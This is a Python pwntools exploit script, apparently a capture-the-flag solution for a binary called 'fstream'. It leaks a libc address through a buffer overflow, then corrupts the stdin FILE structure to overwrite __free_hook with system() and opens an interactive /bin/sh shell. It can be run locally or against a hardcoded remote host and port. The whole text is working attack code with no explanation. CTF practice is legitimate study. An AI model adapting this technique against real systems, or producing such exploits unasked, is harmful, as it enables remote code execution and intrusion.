from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./fstream"
LIBC = LOCAL_LIBC64
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
#context.log_level = "debug"

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def leak(conn):
    conn.recvuntil("> ")
    conn.send("11010110")
    conn.recvuntil("> ")
    conn.send("A"*0x98)
    conn.recv(0x98)
    lk = u64(conn.recv(6).ljust(8, "\x00"))
    conn.recvuntil("> ")
    conn.send("11111111")
    return lk

def ccloud(conn, l, s=None):
    conn.recvuntil("> ")
    conn.sendline(str(l))
    conn.recvuntil("> ")
    conn.send(s)

def exploit(conn, elf, libc, local):
    libcleak = leak(conn)
    libc.address = libcleak - 0x20830
    log.info("%#x", libc.address)
    conn.send("10110101")

    # random stuff
    ccloud(conn, libc.address + 0x3c4918 + 1, "\n") # stdin 0x3c48e0
    payload = ""
    payload += p64(libc.address + 0x3c67a8) # __free_hook address
    payload += p64(libc.address + 0x3c67a8)
    payload += p64(libc.address + 0x3c67b0)
    payload += p64(libc.address + 0x3c67a8)
    payload += p64(libc.address + 0x3c67b0)
    #ccloud(conn, payload, "\x00")
    conn.recvuntil("> ")
    conn.send(payload)
    conn.recvuntil("> ")
    conn.send("\x00")

    conn.recvuntil("> ")
    conn.send("\x00"*0xa8 + p64(libc.symbols['system']))
    conn.recvuntil("> ")
    conn.send("\x00")

    ccloud(conn, 8, "/bin/sh\x00")
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("178.62.40.102", 6002)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
